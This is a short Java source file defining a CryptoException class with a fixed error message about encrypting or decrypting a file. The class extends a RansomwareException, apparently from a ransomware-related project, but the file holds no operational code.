package server.exceptions;

public class CryptoException extends RansomwareException {
	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;

	public CryptoException()

	{
		super("Error encrypting/decrypting file");
	}
}
